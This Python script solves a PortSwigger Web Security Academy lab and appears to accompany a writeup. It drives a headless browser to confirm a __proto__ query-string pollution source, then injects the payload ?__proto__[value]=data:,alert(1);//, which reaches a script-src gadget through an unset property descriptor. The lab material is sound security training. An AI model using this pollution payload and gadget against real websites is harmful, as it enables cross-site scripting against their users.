#!/usr/bin/env python3
"""
Client-side prototype pollution via browser APIs
PortSwigger Web Security Academy -- Client-Side Prototype Pollution

Companion script for the writeup: 01-browser-apis.md

What this does:
    Confirms the bracket-notation prototype pollution source
    (?__proto__[foo]=bar), then pollutes Object.prototype.value. The page's
    searchLoggerConfigurable.js locks the transport_url property down with
    Object.defineProperty({configurable: false, writable: false}) but never
    specifies a 'value' key in the descriptor -- so the unset 'value' key
    falls through the prototype chain and supplies transport_url anyway.
    transport_url is then used as the src of a dynamically injected
    <script> tag, so a data: URL fires as JavaScript. Requires a real
    browser engine (Playwright) since the pollution and the sink only
    exist in client-side JS, never in an HTTP response.

Usage:
    python 01-browser-apis.py <lab-url>
    e.g. python 01-browser-apis.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install playwright && playwright install chromium
"""

import sys
import time

from playwright.sync_api import sync_playwright


def solve(lab_url: str) -> None:
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        dialogs = []
        page.on("dialog", lambda d: (dialogs.append(d.message), d.accept()))

        # Confirm the bracket-notation source exists at all.
        probe_url = f"{lab_url}/?__proto__[pptest]=confirmed"
        page.goto(probe_url, wait_until="networkidle")
        polluted = page.evaluate("() => Object.prototype.pptest")
        if polluted != "confirmed":
            print("[-] Bracket-notation source did not pollute Object.prototype -- aborting.")
            browser.close()
            return
        print("[+] Source confirmed: ?__proto__[foo]=bar pollutes Object.prototype")

        # Fire the real payload: pollute 'value', which the descriptor for
        # transport_url inherits since Object.defineProperty() never sets it.
        exploit_url = f"{lab_url}/?__proto__[value]=data:,alert(1);//"
        print(f"[*] Navigating to: {exploit_url}")
        page.goto(exploit_url, wait_until="networkidle")
        time.sleep(2)  # let the dynamically appended <script> load and fire

        if dialogs:
            print(f"[+] alert() fired: {dialogs[0]!r} -- 'value' gadget reached transport_url")
        else:
            print("[-] No alert() observed -- gadget may not have fired")

        check = page.goto(lab_url, wait_until="networkidle")
        html = check.text() if check else ""
        if "Congratulations" in html:
            print("[+] Lab solved.")
        else:
            print("[-] Not solved yet.")
        browser.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
